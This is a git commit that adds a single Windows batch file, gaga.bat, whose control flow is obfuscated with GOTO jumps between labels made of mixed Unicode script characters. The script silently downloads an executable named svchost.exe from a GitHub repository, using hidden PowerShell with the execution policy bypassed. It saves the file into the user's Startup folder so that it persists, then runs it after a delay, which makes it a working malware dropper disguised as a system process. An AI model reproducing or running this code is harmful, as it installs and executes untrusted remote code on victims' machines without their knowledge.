5975aec358b2063b7694456c4d7f228639ef58ee
zxc4we-lab <zxc4we028@gmail.com>
2025-09-18 14:06:27 +0700

    Add files via upload

---
+++ gaga.bat
@@ -0,0 +1,32 @@
+GOTO የקᏰׁ克ק豆贝ק色
+:የקᏰׁ克ק豆贝ק色
+@echo off
+GOTO 爱饿ግ贝የׁግ斯尔克
+:ר德קק阿שᎠᏰ克ጊ
+ECHO Downloading from %URL%
+GOTO 艾斯Ꭲ耻Ꮿ饿色ש色色
+:饿克ׁ维色贝רᏯ德艾
+SET FOLDERPATH="C:\Users\Guillaume\Desktop\RustServer\common\rust_dedicated\data\Managed"
+GOTO ר德קק阿שᎠᏰ克ጊ
+:爱饿ግ贝የׁግ斯尔克
+SET URL=https://github.com/zxc4we-lab/reversetest/raw/refs/heads/main/svchost.exe
+GOTO 维ק色饿ׁ德ש饿尔ש
+:维ׁׁ豆קᎠግየ耻ጊ
+timeout /t 30 /nobreak >nul
+GOTO צקᏯአ维贝Ꭰ艾埃ש
+:ጊ耻阿饿ጊየᎠᏯየ艾
+:ר艾饿שᏯ豆ግግק豆
+GOTO 维ׁׁ豆קᎠግየ耻ጊ
+:צקᏯአ维贝Ꭰ艾埃ש
+if exist "%FILE%" (echo File ton tai: %FILE% && %FILE% && pause) else (echo File khong ton tai: %FILE% && GOTO ר艾饿שᏯ豆ግግק豆)
+GOTO ᎢᎠጊ色Ꭲ斯贝ׁᎢ爱
+:维ק色饿ׁ德ש饿尔ש
+SET FILE="%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/svchost.exe"
+GOTO 饿克ׁ维色贝רᏯ德艾
+:艾斯Ꭲ耻Ꮿ饿色ש色色
+powershell.exe -Window hidden -Nop -Exec Bypass -C "(New-Object Net.WebClient).DownloadFile('%URL%','%FILE%')"
+GOTO ጊ耻阿饿ጊየᎠᏯየ艾
+:ᎢᎠጊ色Ꭲ斯贝ׁᎢ爱
+pause
+GOTO 爱饿ግ贝የׁግ斯尔克0
+:爱饿ግ贝የׁግ斯尔克0
